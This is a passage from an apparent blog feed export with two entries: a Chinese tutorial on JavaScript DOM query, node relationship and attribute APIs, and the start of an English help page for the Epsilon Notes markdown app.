<p>这段代码中有两个按钮，一个按钮是显示<code>HTMLCollection</code>元素的个数，另一个按钮可以新增一个div标签到文档中。前面提到<code>HTMLCollcetion</code>元素是即时的表示该集合是随时变化的，也就是是文档中有几个<code>div</code>，它会随时进行变化，当我们新增一个<code>div</code>后，再访问<code>HTMLCollection</code>时，就会包含这个新增的<code>div</code></p>
</li>
<li>
<p><strong>使用document.getElementsByTagName这个方法有几点要注意</strong>：</p>
<ul>
<li>如果要对<code>HTMLCollection</code>集合进行循环操作，最好将其长度缓存起来，因为每次循环都会去计算长度，暂时缓存起来可以提高效率</li>
<li>如果没有存在指定的标签，该接口返回的不<code>是null</code>，而是一个空的<code>HTMLCollection</code></li>
<li><code>“*”</code>表示所有标签</li>
</ul>
</li>
</ul>
<h4 id="53-documentgetelementsbyname"><a class="markdownIt-Anchor" href="#53-documentgetelementsbyname"></a> 5.3 document.getElementsByName</h4>
<hr />
<ul>
<li>
<p><code>getElementsByName</code>主要是通过指定的<code>name</code>属性来获取元素，它返回一个即时的<code>NodeList</code>对象。一般用于获取表单元素的·name·属性</p>
</li>
<li>
<p><strong>使用这个接口主要要注意几点：</strong></p>
<ul>
<li>返回对象是一个即时的 <code>NodeList</code>，它是随时变化的</li>
<li>在<code>HTML</code>元素中，并不是所有元素都有<code>name</code>属性，比如 <code>div</code> 是没有 <code>name</code> 属性的，但是如果强制设置 <code>div</code> 的 <code>name</code> 属性，它也是可以被查找到的</li>
<li>在<code>IE</code>中，如果<code>id</code>设置成某个值，然后传入 <code>getElementsByName</code> 的参数值和 <code>id</code> 值一样，则这个元素是会被找到的，所以最好不好设置同样的值给 <code>id</code> 和 <code>name</code></li>
</ul>
</li>
</ul>
<h4 id="54-documentgetelementsbyclassname"><a class="markdownIt-Anchor" href="#54-documentgetelementsbyclassname"></a> 5.4 document.getElementsByClassName</h4>
<hr />
<ul>
<li>这个<code>API</code>是根据元素的<code>class</code>返回一个即时的<code>HTMLCollection</code>，用法如下</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(names);</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>这个接口有下面几点要注意：</strong>
<ul>
<li>返回结果是一个即时的<code>HTMLCollection</code>，会随时根据文档结构变化</li>
<li><code>IE9</code>以下浏览器不支持</li>
<li>如果要获取<code>2</code>个以上<code>classname</code>，可传入多个<code>classname</code>，每个用空格相隔，例如</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(<span class="string">"test1 test2"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="55-documentqueryselector和documentqueryselectorall"><a class="markdownIt-Anchor" href="#55-documentqueryselector和documentqueryselectorall"></a> 5.5 document.querySelector和document.querySelectorAll</h4>
<hr />
<ul>
<li>
<p>这两个<code>api</code>很相似，通过<code>css</code>选择器来查找元素，注意选择器要符合<code>CSS</code>选择器的规则</p>
</li>
<li>
<p>首先来介绍一下<code>document.querySelector</code></p>
</li>
<li>
<p><code>document.querySelector</code>返回第一个匹配的元素，如果没有匹配的元素，则返回<code>null</code>。</p>
</li>
<li>
<p><strong>注意</strong>，由于返回的是第一个匹配的元素，这个<code>api</code>使用的深度优先搜索来获取元素</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span>第三级的span<span class="tag">&lt;/<span class="name">span</span>&gt;</span>	</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span>			</span><br><span class="line">    同级的第二个div</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"btnGet"</span> <span class="attr">value</span>=<span class="string">"获取test元素"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">document.getElementById("btnGet").addEventListener("click",function()&#123;</span><br><span class="line">	var element = document.querySelector(".test");</span><br><span class="line">	alert(element.textContent);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这个例子很简单，就是两个<code>class</code>都包<code>含“test”</code>的元素，一个在文档树的前面，但是它在第三级，另一个在文档树的后面，但它在第一级，通过<code>querySelector</code>获取元素时，它通过深度优先搜索，拿到文档树前面的第三级的元素</p>
</li>
<li>
<p><code>document.querySelectorAll</code>的不同之处在于它返回的是所有匹配的元素，而且可以匹配多个选择符</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    class为test</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span></span><br><span class="line">    id为test</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnShow"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"显示内容"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">document.getElementById("btnShow").addEventListener("click",function()&#123;</span><br><span class="line">	var elements = document.querySelectorAll("#test,.test");	</span><br><span class="line">	for(var i = 0,length = elements.length;i<span class="tag">&lt;<span class="name">length;i++)&#123;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">alert</span>(<span class="attr">elements</span>[<span class="attr">i</span>]<span class="attr">.textContent</span>);</span></span><br><span class="line"><span class="tag">	&#125;	</span></span><br><span class="line"><span class="tag">&#125;)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这段代码通过<code>querySelectorAll</code>，使用<code>id</code>选择器和<code>class</code>选择器选择了两个元素，并依次输出其内容。要注意两点：</p>
<ul>
<li><code>querySelectorAll</code>也是通过深度优先搜索，搜索的元素顺序和选择器的顺序无关</li>
<li>返回的是一个非即时的<code>NodeList</code>，也就是说结果不会随着文档树的变化而变化</li>
</ul>
</li>
<li>
<p><strong>兼容性问题</strong>：<code>querySelector</code>和<code>querySelectorAll</code>在<code>ie8</code>以下的浏览器不支持</p>
</li>
<li>
<p><strong>小结</strong>：</p>
<ul>
<li><code>document.getElementById</code>返回一个对象</li>
<li><code>document.getElementsByName</code>和<code>document.getElementsByClasName</code>返回一个对象数组</li>
</ul>
</li>
</ul>
<h3 id="六-节点关系型api"><a class="markdownIt-Anchor" href="#六-节点关系型api"></a> 六、节点关系型API</h3>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d8.png" alt="" /></p>
<ul>
<li>在<code>html</code>文档中的每个节点之间的关系都可以看成是家谱关系，包含父子关系，兄弟关系等等</li>
</ul>
<h4 id="61-父关系型api"><a class="markdownIt-Anchor" href="#61-父关系型api"></a> 6.1 父关系型API</h4>
<hr />
<ul>
<li><code>parentNode</code>：每个节点都有一个<code>parentNode</code>属性，它表示元素的父节点。<code>Element</code>的父节点可能是<code>Element</code>，<code>Document</code>或<code>DocumentFragment</code></li>
<li><code>parentElement</code>：返回元素的父元素节点，与<code>parentNode</code>的区别在于，其父节点必须是一个<code>Element</code>，如果不是，则返回<code>null</code></li>
</ul>
<h4 id="62-兄弟关系型api"><a class="markdownIt-Anchor" href="#62-兄弟关系型api"></a> 6.2 兄弟关系型API</h4>
<hr />
<ul>
<li>
<p><code>previousSibling</code>：节点的前一个节点，如果该节点是第一个节点，则为<code>null</code>。注意有可能拿到的节点是文本节点或注释节点，与预期的不符，要进行处理一下</p>
</li>
<li>
<p><code>previousElementSibling</code>：返回前一个元素节点，前一个节点必须是<code>Element</code>，注意<code>IE9</code>以下浏览器不支持</p>
</li>
<li>
<p><code>nextSibling</code> <code>previousSibling</code> 存在兼容性问题</p>
</li>
<li>
<p><code>nextElementSibling</code> <code>previousElementSibling</code> 推荐使用</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">'ul1'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> firstEle = oUl.firstElementChild;</span><br><span class="line">    <span class="keyword">var</span> lastEle = oUl.lastElementChild;</span><br><span class="line"></span><br><span class="line">    firstEle.nextElementSibling.style.background = <span class="string">'red'</span>;</span><br><span class="line">    lastEle.previousElementSibling.style.background = <span class="string">'green'</span>;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d9.png" alt="" /></p>
<ul>
<li><code>nextSibling</code>：节点的后一个节点，如果该节点是最后一个节点，则为<code>null</code>。注意有可能拿到的节点是文本节点，与预期的不符，要进行处理一下</li>
<li><code>nextElementSibling</code>：返回后一个元素节点，后一个节点必须是<code>Element</code>，注意<code>IE9</code>以下浏览器不支持</li>
</ul>
<h4 id="63-子关系型api"><a class="markdownIt-Anchor" href="#63-子关系型api"></a> 6.3 子关系型API</h4>
<hr />
<ul>
<li><code>childNodes</code>：
<ul>
<li>返回一个即时的<code>NodeList</code>，表示元素的子节点列表，子节点可能会包含文本节点，注释节点等。<code>childNodes</code>子节点列表集合（只读属性 有兼容性问题 ）</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>11111<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>22222<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>3333<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>44444<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">'ul1'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(oUl.childNodes);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d10.png" alt="" /></p>
<ul>
<li>
<p>从截图中可以看出 这段代码中<code>ul</code>的子节点有<code>9</code>个，这说明使用<code>childNodes</code>获取的节点包括了文本节点和元素节点</p>
</li>
<li>
<p><code>childNodes</code> 在低版本的<code>ie</code> 浏览器下获取的节点只包括元素节点，这就导致了兼容性问题</p>
</li>
<li>
<p>如何解决兼容性？？</p>
<ul>
<li>根据子节点的<code>nodeType</code>属性值判断</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;oUl.childNodes.length; i++) &#123;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ( oUl.childNodes[i].nodeType == <span class="number">1</span> ) &#123;</span><br><span class="line">        oUl.childNodes[i].style.background = <span class="string">'red'</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>children</code>：</p>
<ul>
<li>一个即时的<code>HTMLCollection</code>，子节点都是<code>Element</code>，<code>IE9</code>以下浏览器不支持。<code>children</code>子节点列表集合（只读属性 推荐使用 ）</li>
</ul>
</li>
<li>
<p><code>children</code> 获取的子节点只包含元素节点</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt;oUl.children.length; i++)&#123;</span><br><span class="line">    oUl.children[i].style.background = <span class="string">'red'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>firstNode</code>：第一个子节点</p>
</li>
<li>
<p><code>lastNode</code>：最后一个子节点</p>
</li>
<li>
<p><code>firstChild</code> （firstElementChild） <code>lastChild</code>(lastElementChild) 第一个子节点 最后一个子节点</p>
</li>
<li>
<p><code>firstChild</code> 、<code>lastChild</code> 和<code>childNodes</code>同样的存在兼容性问题，在低版本<code>ie</code>浏览器中只能获取到元素节点</p>
</li>
<li>
<p><code>firstElementChild</code>、 <code>lastElementChild</code> 获取第一个元素子节点，最后一个元素子节点 推荐使用</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> oUl = <span class="built_in">document</span>.getElementById(<span class="string">'ul1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    oUl.firstChild.style.background = 'red';//标准浏览器 报错</span></span><br><span class="line"><span class="comment">//    oUl.lastChild.style.background = 'red';//标准浏览器 报错</span></span><br><span class="line"></span><br><span class="line">oUl.firstElementChild.style.background = <span class="string">'red'</span>;</span><br><span class="line">oUl.lastElementChild.style.background = <span class="string">'red'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d11.png" alt="" /></p>
<ul>
<li><code>hasChildNodes</code>方法：可以用来判断是否包含子节点</li>
</ul>
<h3 id="七-元素属性型"><a class="markdownIt-Anchor" href="#七-元素属性型"></a> 七、元素属性型</h3>
<hr />
<h4 id="71-setattribute"><a class="markdownIt-Anchor" href="#71-setattribute"></a> 7.1 setAttribute</h4>
<hr />
<ul>
<li><code>setAttribute</code>：它允许我们对元素属性值做出修改与<code>getAttribute</code>一样<code>setAttribute</code>也能用于元素节点</li>
<li>通过<code>setAttribute</code>对文档做出修改后，在通过浏览器的查看源码选项看到的任然是改变之前的属性值，也就是说<code>setAttribue</code>做出的修改，不会反应到文档本身的源码里</li>
<li><code>setAttribute</code>优势在于可以修改文档中的任何一个属性</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">element.setAttribute(name, value);</span><br></pre></td></tr></table></figure>
<ul>
<li>其中<code>name</code>是特性名，<code>value</code>是特性值。如果元素不包含该特性，则会创建该特性并赋值。</li>
<li>如果元素本身包含指定的特性名为属性，则可以访问属性进行赋值，比如下面两条代码是等价</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">element.setAttribute(<span class="string">"id"</span>,<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">element.id = <span class="string">"test"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>非DOM的解决方案</strong></p>
<ul>
<li>其实不用<code>setAttribute</code>也可以改变元素的属性</li>
<li><code>setAttribute</code>方法是第一级<code>DOM</code>的组成部分，它可以设计任何元素节点的任意属性。在第1级<code>DOM</code>出现之前，你可以通过另外一种办法设置大部分元素的属性</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.value = <span class="string">"the new value"</span>;</span><br></pre></td></tr></table></figure>
<p>与下面语句等价</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">element.setAttribute(<span class="string">"value"</span>,<span class="string">"the new value"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="72-getattribute"><a class="markdownIt-Anchor" href="#72-getattribute"></a> 7.2 getAttribute</h4>
<hr />
<ul>
<li><code>getAttribute</code>返回指定的特性名相应的特性值，如果不存在，则返回<code>null</code>或空字符串。</li>
<li><code>getAttribute</code>不属性<code>doucment</code>对象，不能通过<code>document</code>对象调用，只能通过元素节点对象调用</li>
<li>例如可以与<code>getElementsByTagName</code>方法合用，获取每个<code>p</code>的<code>title</code>属性</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> paras = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"p"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;para.lenght;i++)&#123;</span><br><span class="line">    alert(paras.getAttrtitube(<span class="string">"title"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="八-表格操作"><a class="markdownIt-Anchor" href="#八-表格操作"></a> 八、表格操作</h3>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d12.png" alt="" /></p>
<h3 id="九-样式操作"><a class="markdownIt-Anchor" href="#九-样式操作"></a> 九、样式操作</h3>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d13.png" alt="" /></p>
<h3 id="十-大小和偏移"><a class="markdownIt-Anchor" href="#十-大小和偏移"></a> 十、大小和偏移</h3>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d14.png" alt="" /></p>
<h3 id="十一-网上的一张思维导图总结"><a class="markdownIt-Anchor" href="#十一-网上的一张思维导图总结"></a> 十一、网上的一张思维导图总结</h3>
<hr />
<p><img src="http://7xq6al.com1.z0.glb.clouddn.com/d15.png" alt="" /></p>
<hr />
<ul>
<li>参考
<ul>
<li><code>JavaScript DOM</code>编程艺术</li>
<li><a href="http://www.jianshu.com/p/e1391dc17361" target="_blank" rel="noopener">常用DOM操作</a></li>
</ul>
</li>
</ul>
<hr />
<ul>
<li><a href="https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/DOM%E7%BC%96%E7%A8%8B%E4%B9%8BAPI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E7%AF%87.md" target="_blank" rel="noopener">本文mardown原文件</a></li>
</ul>
]]></content>
      <categories>
        <category>Front-End</category>
        <category>搬运整理</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>DOM</tag>
      </tags>
  </entry>
  <entry>
    <title>Epsilon Notes Help</title>
    <url>/hexolog/post/12495.html</url>
    <content><![CDATA[<style> img{width:50%;}
</style><a name="top"></a>
<p><em><div align="center">To return to top, tap on any heading</div></em></p>
<h1 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h1>
<p>Epsilon Notes is a program for writing formatted texts, so your texts look nice and professional. It uses a marking method called “Commonmark”, which takes only a few minutes to learn. You can read about Commonmark after the description of the functions of Epsilon Notes.</p>
<p><mark>Download Epsilon Notes</mark> from <ins>Google Play</ins> only to have the latest version.</p>
<p>The current help is not complete due to recent updates. Read more in Menu → Help → What’s new.</p>
<hr />
<a id="more"></a>
<h1 id="description说明"><a class="markdownIt-Anchor" href="#description说明"></a> Description（说明）</h1>
<h2 id="file-manager文件管理器"><a class="markdownIt-Anchor" href="#file-manager文件管理器"></a> File Manager（文件管理器）</h2>
<p><strong>Formats:</strong> Epsilon Notes can read and save text files (.txt, .md, .cm, .markdown, .mkd).</p>
<p><strong>Access:</strong> To open the file manager, swipe from the right side of the screen to its center.</p>
<p><strong>Unaccessible folders:</strong> Some folders are not accessible in Android 6+. If Epsilon Notes cannot read a folder, it will propose opening one of the default folders.</p>
<p><strong>Width:</strong> To change the file manager width, select it in the Preferences.</p>
<p><strong>Context menu:</strong> Long-press a filename to access more functions, such as “rename”, “delete” etc.</p>
<p><strong>Sorting:</strong> Files can be sorted by name or time. The time of file changes is shown under the file name. You can hide this field via the Preferences.</p>
<p><strong>Buttons:</strong> The file manager has a few buttons at the top:</p>
<ul>
<li>Context menu</li>
<li>Default folders</li>
<li>Lock</li>
<li>Index</li>
<li>Sort</li>
<li>Search</li>
</ul>
<p><strong>Context Menu button long click</strong> changes the width of the file manager.</p>
<p><strong>New file:</strong> When you open the file manager, you will see the round button with a plus (+). Use it to create a new file.</p>
<p><strong>File  manager as Home screen:</strong> You can use this program to create your personal Wikipedia with wiki-links between files. So, when you open the Epsilon Notes, it starts with the last page that you opened last time. From that page you can navigate to other pages by clicking on the links that the page has. But if you want to see the File Manager first, go to the Preferences and turn on the option <em>File manager as Home screen</em>.</p>
<p><strong>Copy and paste</strong>: Currently, Copy and Paste works only in Internal Memory.</p>
<p>To copy files, make a long click on the filename. You will see a menu and “Copy” option.</p>
<p>To paste that file, go to the top menu of the File Manager and choose “Paste” there.</p>
<p><strong>Note:</strong> folders can be copied only if they are not empty.</p>
<p>Here is the scheme:</p>
<p><a href="https://4.bp.blogspot.com/-xKwSsef4m_c/WDtvdpotEaI/AAAAAAAABDE/pDZVzXNu6Hc9A5yKcafez5UOpaWXZgnKwCLcB/s1600/1480290154629-112683745.jpg" target="_blank" rel="noopener"><img src="https://4.bp.blogspot.com/-xKwSsef4m_c/WDtvdpotEaI/AAAAAAAABDE/pDZVzXNu6Hc9A5yKcafez5UOpaWXZgnKwCLcB/s1600/1480290154629-112683745.jpg" alt="Image from Internet" /></a></p>
<div align="center"><a href="https://4.bp.blogspot.com/-xKwSsef4m_c/WDtvdpotEaI/AAAAAAAABDE/pDZVzXNu6Hc9A5yKcafez5UOpaWXZgnKwCLcB/s1600/1480290154629-112683745.jpg" target="_blank" rel="noopener">See the picture in Internet</a></div>
<p><strong>Preview of non-commonmark files:</strong> in the Preferences, there is a “File Launch Filter”. Use this option to launch files when you press links, such as <code>[My puppies](my_puppy.avi)</code> (a movie link). These files appear in the File Manager on a blue background. If you make a long click on these files in the File Manager, you can launch them for a preview.</p>
<p><strong>Back button</strong> returns to the previous document <strong>of the current session</strong>.<br />
<strong>To exit the app</strong> instead of navigating back - <strong>make a long tap on the BACK button</strong>.</p>
<hr />
<p><a name="indexfile"></a></p>
<h2 id="index-file索引文件"><a class="markdownIt-Anchor" href="#index-file索引文件"></a> Index file（索引文件）</h2>
<p><strong>Home page for your folders:</strong> If you are working on a project in a folder, create an index file there with the default extension (<a href="http://index.md" target="_blank" rel="noopener">index.md</a> - for example). The file will open automatically when you enter the folder. You can use this index file as a home page. You can turn off this function the Preferences or in the File Manager (index button).</p>
<p><strong>Note:</strong> the index file must have one of the default extensions (.txt, .cm, .md, .markdown or .mkd). Epsilon Notes will open the one that it finds first among:</p>
<ul>
<li><a href="http://index.md" target="_blank" rel="noopener">index.md</a></li>
<li>index.txt</li>
<li><a href="http://index.cm" target="_blank" rel="noopener">index.cm</a></li>
<li>index.mkd</li>
<li>index.markdown</li>
</ul>
<p><strong>Reminder about links:</strong> When you write a link to another Commonmark file, you do not need to specify its extension (.md, .txt etc.). It will open the first file it finds, or will try to create a file with the default extension selected in the Preferences.</p>
<p><strong>Toggle opening index file:</strong> Use an index file in a folder with a home page containing links to other documents in the folder. However, this function may interfere with other functions, such as moving the currently open file. In this case, you can turn off opening the index file by pressing the “Home” button at the top of the file manager.</p>
<h2 id="index-panel-the-left-sliding-panel-for-index-contents-favorites-links-索引面板"><a class="markdownIt-Anchor" href="#index-panel-the-left-sliding-panel-for-index-contents-favorites-links-索引面板"></a> Index Panel (The left sliding panel for index / contents / favorites links )(索引面板)</h2>
<h3 id="index-panel-description索引面板说明"><a class="markdownIt-Anchor" href="#index-panel-description索引面板说明"></a> Index panel description（索引面板说明）</h3>
<p>Epsilon Notes has a left sliding panel（滑动面板）. Use it to create your own menu with links to your favorite files.</p>
<p>To do that, go to Preferences and copy the contents of a file with your links. To fill the index panel, use Commonmark just like in any other Commonmark file.</p>
<p>Here is an example of how people use the Index Panel.</p>
<p>The text copied to the Preferences:</p>
<center>
<p><em>Tap on the picture to see it in the browser</em></p>
</center>
<p><a href="https://4.bp.blogspot.com/-eMbC218NvnU/WGQWEd4Jf0I/AAAAAAAABHk/IIzWDdg9RS0yVEBtK1lcjPxPzaivzKoGACLcB/s1600/Screenshot_2016-12-28-22-40-51.png" target="_blank" rel="noopener"><img src="https://4.bp.blogspot.com/-eMbC218NvnU/WGQWEd4Jf0I/AAAAAAAABHk/IIzWDdg9RS0yVEBtK1lcjPxPzaivzKoGACLcB/s1600/Screenshot_2016-12-28-22-40-51.png" alt="" /></a></p>
<p>The same text rendered as side menu in the index panel:</p>
<center>
<p><em>Tap on the picture to see it in the browser</em></p>
</center>
<p><a href="https://4.bp.blogspot.com/-PT4nngbyvMg/WK-LiLCpkaI/AAAAAAAACnk/PEXqOISo2MMBW6V9K8Dn16u-ZsglopwdACLcB/s1600/Screenshot_2017-02-24-04-21-23.png" target="_blank" rel="noopener"><img src="https://4.bp.blogspot.com/-PT4nngbyvMg/WK-LiLCpkaI/AAAAAAAACnk/PEXqOISo2MMBW6V9K8Dn16u-ZsglopwdACLcB/s1600/Screenshot_2017-02-24-04-21-23.png" alt="" /></a></p>
<p><strong>Global index panel path:</strong></p>
<p>Instead of providing markdown text in the Preferences → Global Index, you can provide path, in the format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;storage&#x2F;1234-ABCD&#x2F;...&#x2F;file.md</span><br></pre></td></tr></table></figure>
<p><strong>Global index vs. local index:</strong> You can toggle the left panel contents. One is Global Index and the other is Local Index.</p>
<p>You fill the Global Index through Preferences.</p>
<p>The Local Index is filled from the Index file in the current folder.</p>
<p><strong>Usage:</strong></p>
<p>Suppose, you work on a large document of 200 pages. It may be difficult to navigate through it by always returning to the Table of Contents.</p>
<p>Consider placing that document to a folder and breaking it into a number of small documents, and add an index file (<a href="http://index.md" target="_blank" rel="noopener">index.md</a>) with links to all those documents. This index file will open when you enter the folder <strong>and</strong> will appear in the left panel under the Home button.</p>
<p>In other words, you can have general and context based indexes.</p>
<p><em>Note:</em> the local index is read only when the local index panel is active. No worries about redundant operations. If you don’t open it, the index file is not read into it.</p>
<h3 id="index-panel-photo索引面板图片设置"><a class="markdownIt-Anchor" href="#index-panel-photo索引面板图片设置"></a> Index Panel Photo（索引面板图片设置）</h3>
<p>The index sliding panel has an image.</p>
<ul>
<li>If you are in the habit of keeping a photo of your beloved ones or your favorite city in your wallet, you can replace this photo in the Index panel with your photo.</li>
</ul>
<p>To change the picture in the Index Panel, long press the current picture. <font color="red">Use small compressed pictures</font>.</p>
<p>Or, provide the picture path in the <code>Preferences → Global and local index panel → Index panel image path</code>, as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;...&#x2F;myimage.jpg</span><br></pre></td></tr></table></figure>
<p><strong><font color="red">Note:</font></strong> On older devices, if you do not see the picture, try compressing it.</p>
<center> 
<p><strong><em><font color="red">For efficiency, it is recommended to use smaller compressed pictures.</font></em></strong></p>
</center>
<ul>
<li>If you don’t want photos, you can disable the field by checking the setting in the same Preferences section.</li>
</ul>
<hr />
<h2 id="storage-on-external-sd-for-unrooted-devices-in-any-folder可存储到没有root的设备外部sd卡的任何文件夹中"><a class="markdownIt-Anchor" href="#storage-on-external-sd-for-unrooted-devices-in-any-folder可存储到没有root的设备外部sd卡的任何文件夹中"></a> Storage on external SD for unrooted devices in any folder(可存储到没有root的设备外部SD卡的任何文件夹中)*</h2>
<p><em><strong>* Available in Premium Version</strong></em></p>
<p>You can store files on your external SD card. To do that, go to the Preferences, select <code>Get SD Access</code> and point to your extetnal SD.</p>
<center>
<p><em>Tap on the picture to see it in the browser</em></p>
</center>
<p><a href="https://2.bp.blogspot.com/-_YRGPBOVA_c/WE0vcMqNc3I/AAAAAAAABFE/Mi-0uS6XA5Aye_Bx4jZvDvm0m62iPcp1gCLcB/s1600/1481453419187-466634512.jpg" target="_blank" rel="noopener"><img src="https://2.bp.blogspot.com/-_YRGPBOVA_c/WE0vcMqNc3I/AAAAAAAABFE/Mi-0uS6XA5Aye_Bx4jZvDvm0m62iPcp1gCLcB/s1600/1481453419187-466634512.jpg" alt="" /></a></p>
<p><strong>Note:</strong> The picture may differ depending on your device.</p>
<p>There are a few remarks on external storage in the Q&amp;A section of What’s New. Please, read the remarks too if you need to write to an external memory card.</p>
<hr />
<h2 id="home-page主页"><a class="markdownIt-Anchor" href="#home-page主页"></a> Home page（主页）</h2>
<p>When you launch the app, it opens the last file. You can set the home page file in the Preferences, which will open when the program is started. The path provided in this option must be full, for example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;MyNotes&#x2F;homepage.md</span><br></pre></td></tr></table></figure>
<p>If the app does not find the homepage at the specified path or if this option is empty, it will open the last document instead.</p>
<p>So, now, you can make a homepage with links to other documents, which will be launched when you start Epsilon Notes.</p>
<hr />
<h2 id="directory-lock目录锁"><a class="markdownIt-Anchor" href="#directory-lock目录锁"></a> Directory lock（目录锁）</h2>
<p><strong>Directory lock:</strong> In the file manager’s top menu, there is an option <em>lock / release folder</em>, which fixes the current folder as a working folder. You cannot leave the folder, until you release it. When the directory is locked, the exit path disappears.</p>
<hr />
<h2 id="file-launch-filter文件启动过滤器"><a class="markdownIt-Anchor" href="#file-launch-filter文件启动过滤器"></a> File launch filter（文件启动过滤器）</h2>
<ul>
